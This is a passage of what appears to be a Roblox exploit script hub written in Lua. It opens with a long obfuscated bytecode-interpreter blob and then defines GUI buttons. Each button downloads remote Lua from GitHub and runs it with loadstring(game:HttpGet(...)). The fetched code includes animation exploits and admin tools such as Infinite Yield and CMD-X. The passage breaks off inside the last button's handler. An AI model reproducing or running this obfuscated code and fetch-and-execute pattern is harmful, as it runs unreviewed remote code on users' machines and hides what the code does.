c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=307 then if c<=305 then if(e[o[2]]>=e[o[5]])then d=d+1;else d=d+o[3];end;elseif c>306 then local J;local D;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;else e[o[2]]=e[o[3]]/n[o[5]];end;elseif c<=308 then e[o[2]]=n[o[3]]*e[o[5]];elseif c>309 then local a;local D;local c;local C;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=A+o[3]-1;for o=A+1,c do C[#C+1]=e[o];end;do return e[A](r(C,1,c-A))end;d=d+1;o=l[d];A=o[2];c=B;D={};a=0;for o=A,c do a=a+1;D[a]=e[o];end;do return r(D,1,a)end;d=d+1;o=l[d];do return end;else local d=o[2];local n={};local l=0;local o=d+o[3]-1;for o=d+1,o do l=l+1;n[l]=e[o];end;e[d](r(n,1,o-d));B=d;end;elseif c<=320 then if c<=315 then if c<=312 then if c==311 then local S;local J;local a;local c;local C;local D;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];A=o[2];a=A+o[3]-2;S={};c=0;for o=A,a do c=c+1;S[c]=e[o];end;do return r(S,1,c)end;d=d+1;o=l[d];do return end;else local o=o[2];do return e[o]();end;end;elseif c<=313 then e[o[2]]=n[o[3]]/e[o[5]];elseif c>314 then local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];else local J;local C;local c;local D;local a;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];a=e[o[3]];e[A+1]=a;e[A]=a[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;C=A+o[3]-1;for o=A+1,C do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,C-A))};C=A+o[5]-2;c=0;for o=A,C do c=c+1;e[o]=J[c];end;B=C;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];a=e[o[3]];e[A+1]=a;e[A]=a[n[o[5]]];end;elseif c<=317 then if c>316 then e[o[2]]=e[o[3]]-e[o[5]];else local f=o[2];local l={};for o=1,#T do local o=T[o];for d=0,#o do local d=o[d];local n=d[1];local o=d[2];if n==e and o>=f then l[o]=n[o];d[1]=l;end;end;end;end;elseif c<=318 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];elseif c>319 then e[o[2]]={unpack({},1,o[3])};else local J;local a;local c;local C;local D;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];e[A]=e[A]-e[A+2];d=d+o[3];end;elseif c<=325 then if c<=322 then if c>321 then local d=o[2];local l=e[d];local o=o[3];for o=1,o do l[o]=e[d+o]end;else local D;local a;local c;local C;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]();B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];end;elseif c<=323 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];elseif c==324 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;else local J;local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];J=e[o[3]];e[c+1]=J;e[c]=J[n[o[5]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];J=e[o[3]];e[c+1]=J;e[c]=J[n[o[5]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;end;elseif c<=328 then if c<=326 then local a;local A;local c;local f;e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];f=o[2];c={};A=0;a=f+o[3]-1;for o=f+1,a do A=A+1;c[A]=e[o];end;e[f](r(c,1,a-f));B=f;d=d+1;o=l[d];do return end;elseif c==327 then local S;local A,A;local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};a=B;for o=c+1,a do C[#C+1]=e[o];end;do return e[c](r(C,1,a-c))end;d=d+1;o=l[d];c=o[2];a=B;S={};A=0;for o=c,a do A=A+1;S[A]=e[o];end;do return r(S,1,A)end;d=d+1;o=l[d];do return end;else e[o[2]]=e[o[3]]*e[o[5]];end;elseif c<=329 then e[o[2]]=e[o[3]][n[o[5]]];elseif c==330 then local C;local A;local f;local a;local c;local n;n=o[2];c=e[o[3]];e[n+1]=c;e[n]=c[e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];n=o[2];a={};f=0;A=n+o[3]-1;for o=n+1,A do f=f+1;a[f]=e[o];end;C={e[n](r(a,1,A-n))};A=n+o[5]-2;f=0;for o=n,A do f=f+1;e[o]=C[f];end;B=A;d=d+1;o=l[d];if e[o[2]]then d=d+1;else d=d+o[3];end;else local o=o[2];local l=e[o];local d=B-o;for d=1,d do l[d]=e[o+d]end;end;d=d+1;end;end;end;return K(H(),{},G())();
end)

AnimationsSection:NewButton("Big Boi legs", "BIIIIIIG LEGS!!!!!!!", function()
	loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/7291747e9f093555573e027621f08d6e/raw/23b48f2463942befe19d81aa8a06e3222996242c/FE%2520Da%2520Feets'))()
end)

AnimationsSection:NewButton("Among OOS", "E", function()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/Bjmansell/Hex-Hub/main/Among%20us", true))()
end)

AnimationsSection:NewButton("Pet script!", "turns u into a pet", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Bjmansell/Hex-Hub/main/Pet%20script", true))()
end)

local AdminSection = Player:NewSection("Admin UI's")

AdminSection:NewButton("Infinite yeild UI", "Load the Infinite Yeild UI", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

AdminSection:NewButton("CMD-X Admin", "Loads the CMDX admin!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
end)

AdminSection:NewButton("Revz Admin", "Loads the GUI i dont even know why u looking at this", function()
